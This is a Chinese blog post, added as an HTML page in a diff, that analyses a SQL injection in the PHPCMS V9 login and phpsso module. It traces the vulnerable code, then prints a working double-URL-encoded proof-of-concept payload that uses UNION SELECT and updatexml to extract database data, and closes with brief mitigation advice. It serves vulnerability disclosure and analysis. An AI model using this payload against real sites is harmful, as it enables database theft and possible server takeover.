@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+  <head>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      PHPCMS用户登陆SQL注入漏洞分析 &middot; 奇门遁甲
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/public/css/poole.css">
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/hyde.css">
+  <link rel="stylesheet" href="/public/css/label.css">
+  <link rel="stylesheet" href="/public/css/global.css">
+
+  <!-- Icons -->
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+
+</head>
+
+
+  <body class="theme-base-ff">
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          奇门遁甲
+        </a>
+      </h1>
+      <p class="lead"></p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Home</a>
+
+
+      </ul>
+      
+
+      
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/about.html">About</a>
+          
+        
+      
+        
+      
+        
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/tags.html">标签</a>
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+
+        <a class="sidebar-nav-item" href="/categories.html" >文章分类</a>
+        <ul class="sidebar-nav-subitem">
+            
+            <li><a href="/categories.html#读书">读书 <small>(3)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#随想">随想 <small>(5)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#技术">技术 <small>(5)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#no-category">未分类</a>
+            </li>
+        </ul>
+    </nav>
+
+  </div>
+</div>
+
+
+    <div class="content container">
+      <div class="post">
+  <h1 class="post-title">PHPCMS用户登陆SQL注入漏洞分析</h1>
+  <p>
+      <span >21 Jul 2015 by
+          <a href="#"></a>
+      </span>&nbsp;&nbsp;
+      
+         <span class="ui mini tag label" >phpcms</span>
+      
+         <span class="ui mini tag label" >sql注入</span>
+      
+  </p>
+  <h2 id="x00-">0x00 简述</h2>
+
+<p>之前manning在调漏洞的时候，突然发现正常登陆不上去了，当时帮忙跟了下phpcms的登陆流程。之后感觉这个流程貌似有些问题，就仔细看了下，没想到真是一个0day~~</p>
+
+<h2 id="x01-">0x01 漏洞原理</h2>
+
+<p>我们先直接看这个漏洞最根源的地方，phpsso/index.php文件所有的操作都存在严重的注入问题，这个类文件的构造函数最先调用它的父构造函数，通过auth_key来解析POST传入的data内容，解析后data中的内容会作为注册、登陆、删除用户等操作的内容依据，而这些操作都会将这些数据作为数据库查询语句使用。这个问题其实在XXX的《PHPCMS V9 最新版本配置文件未授权访问读取》中已经体现出来了，不过他仅仅只是分析了信息泄露的问题，而忽略的他利用所使用的注入问题。</p>
+
+<!-- more -->
+
+<p>我们以phpsso的login流程为例来看这个问题，先看phpsso的解析数据部分的代码：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>		if(isset($_POST['appid'])) {
+			$this-&gt;appid = intval($_POST['appid']);
+		} else {
+			exit('0');
+		}
+
+
+		if(isset($_POST['data'])) {
+			parse_str(sys_auth($_POST['data'], 'DECODE', $this-&gt;applist[$this-&gt;appid]['authkey']), $this-&gt;data);
+			if(empty($this-&gt;data) || !is_array($this-&gt;data)) {
+				exit('0');
+</code></pre>
+</div>
+
+<p>在auth_key解码之后使用parse_str解析成数组格式，这段代码如果在php5.3之前的情况下是没有问题的，因为默认情况下parse_str会启动gpc机制对特殊字符进行转义。但是在php5.3之后gpc机制默认就关闭掉了，这就导致如果解析出来的内容如果带有单引号这类个特殊字符，就原封不动的放到的变量中，这导致了注入的风险。下面我们简单来看一下login行为的代码：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>	public function login() {
+		$this-&gt;password = isset($this-&gt;data['password']) ? $this-&gt;data['password'] : '';
+		$this-&gt;email = isset($this-&gt;data['email']) ? $this-&gt;data['email'] : '';
+		if($this-&gt;email) {
+			$userinfo = $this-&gt;db-&gt;get_one(array('email'=&gt;$this-&gt;email));
+		} else {
+			$userinfo = $this-&gt;db-&gt;get_one(array('username'=&gt;$this-&gt;username));
+		}
+		
+		if ($this-&gt;config['ucuse']) {
+			pc_base::load_config('uc_config');
+			require_once PHPCMS_PATH.'api/uc_client/client.php';
+			list($uid, $uc['username'], $uc['password'], $uc['email']) = uc_user_login($this-&gt;username, $this-&gt;password, 0);
+		}
+		
+		if($userinfo) {
+			//ucenter登陆部份
+			if ($this-&gt;config['ucuse']) {
+				if($uid == -1) {	//uc不存在该用户，调用注册接口注册用户
+					$uid = uc_user_register($this-&gt;username , $this-&gt;password, $userinfo['email'], $userinfo['random']);
+					if($uid &gt;0) {
+						$this-&gt;db-&gt;update(array('ucuserid'=&gt;$uid), array('username'=&gt;$this-&gt;username));
+					}
+				}
+			}
+</code></pre>
+</div>
+
+<p>所有$this-&gt;data的内容没有经过任何处理就直接参数到数据库查询当中，如果我们有auth_key的话，完全可以构造带有恶意的内容提交造成SQL注入漏洞。那么如果没有auth_key怎么办呢？我们可以让使用auth_key的页面帮我们编码，甚至帮助我们提交。因此下面这个看似无关紧要的问题，就成了导致注入必不可少的一步。</p>
+
+<p>说了这么多，终于可以开始入正题了。我们来跟一下登陆的流程，先看member/index.php文件中的login方法:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>			$username = isset($_POST['username']) <span class="err">&amp;&amp;</span> is_username($_POST['username']) ? trim($_POST['username']) : showmessage(L('username_empty'), HTTP_REFERER);
+			$password = isset($_POST['password']) <span class="err">&amp;&amp;</span> trim($_POST['password']) ? trim($_POST['password']) : showmessage(L('password_empty'), HTTP_REFERER);
+			$cookietime = intval($_POST['cookietime']);
+			$synloginstr = ''; //同步登陆js代码
+			
+			if(pc_base::load_config('system', 'phpsso')) {
+				$this-&gt;_init_phpsso();
+				$status = $this-&gt;client-&gt;ps_member_login($username, $password);
+				$memberinfo = unserialize($status);
+</code></pre>
+</div>
+
+<p>通过这段代码我们需要注意到三个地方，首先是username使用的is_username进行了过滤而password没有做任何处理，然后通过client的ps_member_login方法获取一段数据。最需要关注的是最后一个地方，之后所有操作的内容就完全使用的返回的这套数据。</p>
+
+<p>下面我们继续来看ps_member_login这个方法的代码：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>public function ps_member_login($username, $password, $isemail=0) {
+		if($isemail) {
+			if(!$this-&gt;_is_email($username)) {
+				return -3;
+			}
+			$return = $this-&gt;_ps_send('login', array('email'=&gt;$username, 'password'=&gt;$password));
+		} else {
+			$return = $this-&gt;_ps_send('login', array('username'=&gt;$username, 'password'=&gt;$password));
+		}
+		return $return;
+	}
+
+private function _ps_send($action, $data = null) {
+ 		return $this-&gt;_ps_post($this-&gt;ps_api_url."/index.php?m=phpsso<span class="err">&amp;</span>c=index<span class="err">&amp;</span>a=".$action, 500000, $this-&gt;auth_data($data));
+	}
+</code></pre>
+</div>
+
+<p>可以看出使用_ps_post这个方法向phpsso机制的请求login行为，也就是说member的认证其实是有phpsso来完成的。而phpsso的认证数据是需要auth_key编码的，那么这个过程就很直接的呈现在我们眼前：登录用户提交用户名和密码给menber的login，然后member的login通过ps_member_login构造发送phpsso请求login验证的http包，并且将用户名和密码使用auth_key进行编码，作为http包的post数据，phpsso认证完成后，将用户的信息返回给member的login进行后续处理。</p>
+
+<p>上面的这个过程中我们需要牢记的一点，就是password没有做任何处理。带着这一点，我们再回头看phpsso的login注入问题点，就可以很明确的发现通过password能够造成注入问题。</p>
+
+<p>我们在这里简单总结下漏洞原因，首先member的login没有对password做过滤便带入到phpsso的login中进行验证，然后phpsso没有对于解码数据进行过滤，从而导致SQL注入。</p>
+
+<h2 id="x02-">0x02 漏洞利用</h2>
+
+<p>password字段如果存在特殊字符，在传入到程序时仍然会被转义，而且在phpsso的login中使用的是username做数据库查询，而不是password。</p>
+
+<p>针对第一个问题我们可以使用二次url编码的方法来搞定，在解码之后程序还是用了parse_str对字符串进行了拆解，而这个函数还附带了解url编码的功能。所以，我们只需要在传password内容时传递%2527就可以让单引号出现在phpsso的变量中了。</p>
+
+<p>第二个问题也用到parse_str的功能，parse_str在解析“username=123&amp;password=456”这样的字符串，会把它解析为：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Array(
+    username=&gt;123,
+    password=&gt;456
+)
+</code></pre>
+</div>
+
+<p>那么如果被解析字符串变成“usernamen=123&amp;password=456&amp;username=789”，他就会被解析为：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Array(
+    username=&gt;789,
+    password=&gt;456
+}
+</code></pre>
+</div>
+
+<p>那这样我们的利用思路就有了：将”&amp;username=”进行url编码后作为password的值用于在phpsso中覆盖之前的username值，在“&amp;username=”后面添加进行两次url编码的SQL语句，构造出来的POST数据如下：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>usernmae=phpcms&amp;password=%26username%3d%2527
+</code></pre>
+</div>
+
+<h2 id="x03-">0x03 进阶利用</h2>
+
+<p>按照上一小节的步骤我们可以获得到一个盲注点，但是感觉有些鸡肋。不过当我再回头看member的login流程的最后一步时，想到了一个有趣的进阶利用方法，就是利用注入来构造注入，我个这种方法起名字叫注入接力（和二次注入稍有不同）。</p>
+
+<p>前文我们提到了member的login再从phpsso获取数据后，所有的操作都使用的是这些数据。那么如果我们结合之前的SQL注入，返回一段带有SQL注入语句的数据，不就可以造成再一次的注入吗。</p>
+
+<p>不过这里有一个地方需要注意，就是在/phpsso_server/phpcms/modules/phpsso/index.php的login中结尾会使用uid更新登陆信息，所以为了可以实现在member的login中注入不能把注入语句写到uid中。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>		if(!empty($userinfo) <span class="err">&amp;&amp;</span> $userinfo['password'] == create_password($this-&gt;password, $userinfo['random'])) {
+			//登录成功更新用户最近登录时间和ip
+			$this-&gt;db-&gt;update(array('lastdate'=&gt;SYS_TIME, 'lastip'=&gt;ip()), array('uid'=&gt;$userinfo['uid']));
+			exit(serialize($userinfo));
+		}
+</code></pre>
+</div>
+
+<p>由于这个问题我们不能在member的login中的第一个getone查询中进行注入，只好退而求其次，在之后的insert中实现注入攻击。</p>
+
+<p>测试poc原文如下：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>username=phpcms&amp;password=123456&amp;username=' union select '2','test\',updatexml(1,concat(0x5e24,(select user()),0x5e24),1),\'123456\',\'\',\'\',\'\',\'\',\'\',\'2\',\'10\'),(\'2\',\'test','5f1d7a84db00d2fce00b31a7fc73224f','123456',null,null,null,null,null,null,null,null,null#
+
+</code></pre>
+</div>
+
+<p>编码后内容如下：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>
+username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523
+</code></pre>
+</div>
+
+<p>效果如下图所示：</p>
+
+<p><img src="/images/content/2015-07-21-poc.png" alt="1" /></p>
+
+<h2 id="x04-">0x04 总结</h2>
+
+<p>这个漏洞分析中，最大的收获是用到漏洞接力这种利用思路来完成由盲注到可报错注入的华丽转身。</p>
+
+<h3 id="section">漏洞小结</h3>
+
+<p>影响范围个人评价为“高”，PHPCMS在国内的使用范围非常广，而且此漏洞影响PHPCMS目前主流的V9版本，虽然收到PHP的版本影响，但是目前大多数的服务都已经开始更换PHP版本，所以影响范围还是很广的。</p>
+
+<p>危害性个人评价为“高”，此漏洞只需要可以访问目标网站便可以实现攻击，获取数据库信息，并有很大的可能getshell。</p>
+
+<h3 id="section-1">防护方案</h3>
+
+<p>针对phpsso模块添加过滤代码，最好的方式应该是将转义和过滤放在数据库操作的前一步，这样可以极有效缓解SQL注入带来的问题。</p>
+
+</div>
+
+<div class="related">
+  <h2>相关文章:</h2>
+  <ul class="related-posts">
+    
+    
+      <li>
+        <h3>
+          <a href="/%E6%8A%80%E6%9C%AF/2016/06/17/Wordpress+ImageMagic%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%88%A9%E7%94%A8%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B.html">
+            Wordpress ImageMagic漏洞测试环境搭建&amp;利用的心路历程
+            <small>17 Jun 2016</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/%E8%AF%BB%E4%B9%A6/2015/04/26/%E7%A4%BE%E4%BA%A4%E7%BD%91%E7%BB%9C%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88-%E5%A4%B1%E6%8E%A7-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%80.html">
+            社交网络需要什么？——《失控》读书笔记一
+            <small>26 Apr 2015</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/%E6%8A%80%E6%9C%AF/2015/03/06/ElasticSearch+%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2015-1427.html">
+            ElasticSearch 远程代码执行漏洞分析（CVE-2015-1427）&amp;高级利用方法
+            <small>06 Mar 2015</small>
+          </a>
+        </h3>
+      </li>
+    
+    
+  </ul>
+</div>
+
+
+<!-- UY BEGIN -->
+<div id="uyan_frame"></div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2093529"></script>
+<!-- UY END -->
+
+    </div>
+
+  </body>
+</html>
